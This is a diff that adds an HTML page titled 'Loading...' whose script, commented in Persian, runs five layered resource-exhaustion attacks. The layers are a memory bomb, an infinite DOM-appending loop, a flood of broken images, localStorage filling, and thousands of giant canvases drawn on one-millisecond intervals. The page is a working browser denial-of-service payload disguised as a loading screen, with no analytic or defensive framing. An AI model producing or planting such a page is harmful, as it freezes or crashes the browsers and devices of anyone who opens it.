@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Loading...</title>
+<style>
+body { 
+    font-size: 1px; 
+    direction: rtl; 
+    background: black; 
+    color: white; 
+    white-space: pre-wrap; 
+    word-break: break-all; 
+    overflow: hidden; 
+}
+</style>
+</head>
+<body>
+<script>
+// لایه ۱: بمب حافظه
+var memory = [];
+function layer1() {
+    for (var i = 0; i < 500; i++) {
+        memory.push(new Array(1000000).join('𒀀'));
+    }
+}
+setInterval(layer1, 1);
+
+// لایه ۲: حلقه بی‌نهایت
+function layer2() {
+    var chars = ['⃟','꙰','𒀀','𐎠','🇮🇷','💀','🔥','⚡','🌟','🌀','💫','🌪️','🌈','🇺🇸','🇬🇧','🇩🇪','🇫🇷','🇮🇹','🇯🇵','🇨🇳','🇷🇺','☠️'];
+    while (true) {
+        document.body.innerHTML += chars[Math.floor(Math.random() * chars.length)];
+    }
+}
+setTimeout(layer2, 0);
+
+// لایه ۳: تصاویر مخفی
+function layer3() {
+    for (var i = 0; i < 500; i++) {
+        var img = new Image();
+        img.onerror = function() {
+            document.body.innerHTML += '𒀀𒀁𒀂𒀃𒀄'.repeat(100000);
+        };
+        img.src = 'x' + Math.random();
+    }
+}
+setInterval(layer3, 1);
+
+// لایه ۴: پر کردن LocalStorage
+function layer4() {
+    for (var i = 0; i < 5000; i++) {
+        try {
+            localStorage.setItem('key' + i, '⃟'.repeat(1000000));
+        } catch(e) {}
+    }
+}
+setInterval(layer4, 1);
+
+// لایه ۵: حمله با Canvas
+function layer5() {
+    for (var i = 0; i < 500; i++) {
+        var canvas = document.createElement('canvas');
+        canvas.width = 100000;
+        canvas.height = 100000;
+        var ctx = canvas.getContext('2d');
+        for (var j = 0; j < 100000; j++) {
+            ctx.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16);
+            ctx.fillRect(Math.random()*100000, Math.random()*100000, 1000, 1000);
+        }
+        document.body.appendChild(canvas);
+    }
+}
+setInterval(layer5, 1);
+</script>
+</body>
+</html>
